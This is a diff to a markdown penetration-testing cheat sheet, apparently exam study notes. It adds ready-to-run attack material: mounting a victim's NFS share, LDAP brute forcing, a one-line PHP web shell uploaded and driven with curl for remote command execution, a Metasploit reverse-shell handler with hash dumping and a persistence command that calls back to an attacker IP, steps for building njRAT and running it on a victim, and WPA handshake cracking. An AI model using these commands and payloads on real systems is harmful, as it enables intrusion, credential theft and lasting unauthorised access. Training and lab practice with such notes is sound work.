@@ -23,7 +23,7 @@
 ### Online Resources
 - [Central Ops .net](https://centralops.net/co/)
 - [OSINT framework](https://osintframework.com/)
-- [NMAP cheatsheet](nmap.md)
+- [NMAP](nmap.md)
 
 ### SX Tool
 ```bash
@@ -118,10 +118,35 @@ smbmap -u "admin" -p "password" -H 10.10.10.10 -x "ipconfig"        #x → comma
   #brute force with hydra
   xfreerdp /v:<TARGET-IP> /u:<uname> /p:<passwd>         #use xfreerdp for gui login or use remmina
 ```
+### NFS
+```bash
+  #Edit victim machine for home-lab scenario /etc/exports
+    vim /etc/exports
+    /nfs-shared 192.14.15.1/24(rw)         #with IP
+    /nfs-shared * (rw)         #with all
   
-### AD Explorer (LDAP)
+    exportfs -rv
+    systemctl restart nfs-server
+    systemctl enable nfs-server
+    #Incase of centos/RHEL
+    firewall-cmd –permanent –add-service=nfs
+    Firewall-cmd --reload
+
+  #On Attacker Machine
+    #Scanning with nmap and get machine details
+  	showmount -e 10.10.10.50          #To check nfs shared folder of victim 
+    #Note: install nfs client packages to access shared folder  
+    apt install nfs
+    #create mount point in attacker
+    mkdir /hacked
+    mount 10.10.10.50:/nfs-shared /hacked
+    df -TH
+```
+### LDAP
 ```js
-  Its an application or try with nmap
+  #AD Explorer is an application to Download and Install on Attacker machine for exploit.
+    We can Provide LDAP name or IP and Check for the domain name and check for users section
+  or try with nmap scripts
   nmap -p 389 –script=ldap-brute –script-args ldap.base=’”cn=users,dc=CEH,dc=com”’ 10.10.1.22
 ```
 ### Additional enumeration
@@ -283,7 +308,17 @@ http://<TARGET-IP>/vulnerable.php?file=../../../../../../../../windows/system32/
 <!--If the app is filtering ../, use URL encoding:-->
 http://<TARGET-IP>/vulnerable.php?file=..%2F..%2FDVWA/uploads/hash.txt
 ```
-
+### File Upload Vulnerability
+If the uploads directory is found, try uploading a PHP shell.
+```bash
+#Create a PHP Reverse Shell
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+#Upload the Shell & Execute below cmds
+curl http://192.168.0.64/uploads/shell.php?cmd=whoami
+#If it returns www-data, we have remote code execution (RCE).
+curl http://192.168.0.64/uploads/shell.php?cmd=find / -name flag.txt 2>/dev/null
+curl http://192.168.0.64/uploads/shell.php?cmd=cat /var/www/html/flag.txt
+```
 ### DVWA
 Basic Commands
 ```bash
@@ -397,25 +432,30 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/
 ```
 
 ### RATs
-- Identify Hidden Running Services:  
+- Identify `nmap -p 1337,4444,8080,9001,3389,5900,2222 10.10.55.0/24`
+    4444(Meterpreter (Metasploit)), 1337(njRAT), 8080(DarkComet, QuasarRAT)  
+    9001(Poison Ivy), 2222(SSH-based RATs (Linux, jailbroken iPhones))  
+    3389(RDP (Can be abused for RAT control))
+- Identify Hidden Running Services on your machine:  
   `Get-Service | Where-Object {$_.Status -eq "Running"}`    #Windows  
-  `ps aux | grep -i "nc\|meterpreter\|rat" `               # Linux  
-- Gaining access via meterpreter then:  
+  `ps aux | grep -i "nc\|meterpreter\|rat" `               # Linux
+- Gaining access if its a metasploit one , with meterpreter:  
   ```bash
-  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER-IP> LPORT=4444 -f exe > rat.exe
   msfconsole
   ~ use exploit/multi/handler
+  ~ set payload windows/meterpreter/reverse_tcp LHOST=<ATTACKER-IP> LPORT=4444
   ~ meterpreter > sysinfo   #or getuid   #user privilege or hashdump  #Extract password hashes
   ~ meterpreter > persistence -U -i 5 -p 4444 -r <ATTACKER-IP>  # Maintain access
   ```
 - Applications like njRAT, DarkComet, QuasarRAT  
-  - Download and install njRAT (file from github blackall9) 
-  - Start njRAT application with default port number and Build then enter attacker IP
-  - Check required checkbox’s on right
-  - Have that Executed on victim machine
+  - Download and install njRAT (file from github blackall9)
+  - Start njRAT application with default port number and connect victim IP
+  - If want to create for homelab , select default port number
+    - Build then enter attacker IP
+    - Check required checkbox’s on right
+    - Have exploit Executed on victim machine
   - Attacker will get the session active in njRAT console
-
-### Theef
+- Theef
   > Server exe need to be run on victim and client exe on Attacker
 
 ### Malware Analysis
@@ -526,6 +566,8 @@ adb pull sdcard/test.txt /home/user/Desktop
 # Crack wireless capture
 aircrack-ng Credmapwifi.cap
 aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> Credmapwifi.cap
+#-a2 → wpa2 handshake
+#-j <file> → create Hashcat version file (HCCAPX) and then with hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt --force
 ```
 
 ### Phonesploit
